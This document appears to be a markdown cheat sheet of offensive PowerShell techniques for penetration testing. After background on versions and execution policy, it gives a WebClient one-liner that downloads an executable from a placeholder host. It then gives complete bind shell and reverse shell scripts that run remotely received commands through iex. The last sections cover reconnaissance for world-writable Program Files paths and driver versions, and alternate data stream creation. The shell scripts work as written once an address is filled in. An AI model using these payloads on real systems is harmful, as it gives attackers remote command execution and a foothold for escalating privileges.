
[PowerShell](https://docs.microsoft.com/en-us/powershell/) 5.0 runs on the following versions of Windows:  
• Windows Server 2016, installed by default  
• Windows Server 2012 R2/Windows Server 2012/Windows Server 2008 R2 with Service Pack 1/Windows 8.1/Windows 7 with Service Pack 1 (install Windows Management Framework 5.0 to run it)  
  
PowerShell 4.0 runs on the following versions of Windows:  
• Windows 8.1/Windows Server 2012 R2, installed by default  
• Windows 7 with Service Pack 1/Windows Server 2008 R2 with Service Pack 1 (install Windows Management Framework 4.0 to run it)  
  
PowerShell 3.0 runs on the following versions of Windows:  
• Windows 8/Windows Server 2012, installed by default  
• Windows 7 with Service Pack 1/Windows Server 2008 R2 with Service Pack 1/2 (install Windows Management Framework 3.0 to run it)  

  
[https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py](https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py)  
  
The default policy is “Restricted”, which effectively means the system will neither load PowerShell configuration files nor run PowerShell scripts  
  
## To set an Unrestricted policy:  
• Run PowerShell as an Administrator  
• **Set-ExecutionPolicy Unrestricted**  
  
Verify with **Get-ExecutionPolicy**   
  
**-c** - Execute given command (wrapped in double-quotes)  
**new-object** - Cmdlet that allows instantiation of either a .NET framework or COM object  
**iex** - Cmdlet that evaluates or runs a specified string as a command and returns the results of the expression or command  
  

## File transfer:
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://ip address/wget.exe','C:\Users\*****\Desktop\wget.exe')"  
wget.exe -V
```
- **WebClient** class, which is defined and implemented in the [System.Net](https://docs.microsoft.com/en-us/dotnet/api/system.net?view=netframework-4.7.2) namespace.  
	- The **WebClient** class is used to access resources identified by a URI and it exposes a public method called **DownloadFile**  
- **DownloadFile** requires two key parameters: a source location (in the form of a URI as we previously stated), and a target location where the retrieved data will be stored.

## Bind Shell:
Use **-n** when connecting w/ [netcat](netcat.md) as bind shell may not always present command prompt on initial connection.
```powershell
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);  
$listener.start();  
$client = $listener.AcceptTcpClient();  
$stream = $client.GetStream();  
[byte[]]$bytes = 0..65535|%{0};  
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)  
{  
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);  
    $sendback = (iex $data 2>&1 | Out-String );  
    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';  
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);  
    $stream.Write($sendbyte,0,$sendbyte.Length);  
    $stream.Flush()  
}  
$client.Close();  
$listener.Stop();
```

## Reverse Shells:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('ip address',port);   
$stream = $client.GetStream();   
[byte[]]$bytes = 0..65535|%{0};   
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)   
{   
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);   
    $sendback = (iex $data 2>&1 | Out-String );   
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';   
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);   
    $stream.Write($sendbyte,0,$sendbyte.Length);   
    $stream.Flush();   
}   
$client.Close();
```


## Find RW files & directories (here w/in the Program Files dir):  
```powershell
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```


## List drivers:  
```powershell
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
```


## Find driver version:
```powershell
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```


## Cmdlets:

**Get-EventLog** - Query Windows Events/ Log parser
	**-LogName** - Name of log to retrieve
	**|** - Can pip for more detailed info
		Ex:
 ```powershell
Get-EventLog -LogName <log> | Format-List -Property * ; | Format-List -Property EventId, Message
```

**Get-Content** - Similar to cat
**Get-ChildItem** - Gets items in one or more specified locations
**Set-Content** -Used to create content and ADS streams
	Ex:
```powershell
Set-Content -Path <.\file.ext> -Stream <ads.ext>
```